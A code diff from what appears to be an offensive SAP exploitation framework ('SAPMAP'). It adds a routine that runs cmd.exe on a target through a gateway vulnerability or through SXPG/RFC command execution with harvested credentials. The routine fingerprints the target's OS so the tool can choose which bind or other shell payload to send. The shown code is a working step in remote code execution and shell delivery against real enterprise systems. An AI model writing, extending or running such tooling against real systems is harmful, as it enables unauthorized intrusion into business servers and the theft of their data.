@@ -499,6 +499,39 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     }
 
 
+def _detect_is_windows(node, method: str = "sxpg") -> bool:
+    """Probe the target to determine whether it is Windows when os_type is unknown.
+
+    Runs ``cmd.exe /C echo __SAPMAP_WIN__`` via SXPG or GW.  If cmd.exe
+    succeeds and echoes the token back, the target is Windows.  Result is
+    cached on ``node.os_type`` so subsequent calls skip the probe.
+
+    Returns True if Windows, False otherwise.
+    """
+    cached = (node.os_type or "").lower()
+    if cached:
+        return any(w in cached for w in ("windows", "nt", "win"))
+
+    probe_token = "__SAPMAP_WIN__"
+    try:
+        if method == "gateway" and node.gw_vulnerable:
+            r = sapmap_exploit.execute_gw_command(
+                node, "cmd.exe", f"/C echo {probe_token}")
+        else:
+            creds = node.best_credentials()
+            if not creds:
+                return False
+            r = sapmap_rfc.execute_local_command(
+                node, "cmd.exe", f"/C echo {probe_token}", creds)
+        if r.get("success") and any(
+                probe_token in line for line in r.get("output", [])):
+            node.os_type = "Windows"   # cache so we don't probe again
+            return True
+    except Exception:
+        pass
+    return False
+
+
 def _detect_python_cmd(node) -> str:
     """Detect whether the target has python3 or python (2.x).
     Caches result on node._python_cmd.
@@ -1695,9 +1728,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         def _send():
             target_host = node.ip or node.hostname
-            # Detect python binary for Linux targets
-            is_win = any(w in (node.os_type or "").lower()
-                         for w in ("windows", "nt", "win"))
+            # Determine OS — probe via cmd.exe if os_type not populated yet
+            # (e.g. freshly-added nodes where the discovery scan hasn't run).
+            # _detect_is_windows caches the result in node.os_type so it
+            # only ever runs the probe once per node.
+            is_win = _detect_is_windows(node, method=method)
             py_cmd = "python3" if is_win else _detect_python_cmd(node)
             if shell_mode == "bind":
                 payload = _generate_bind_payload(
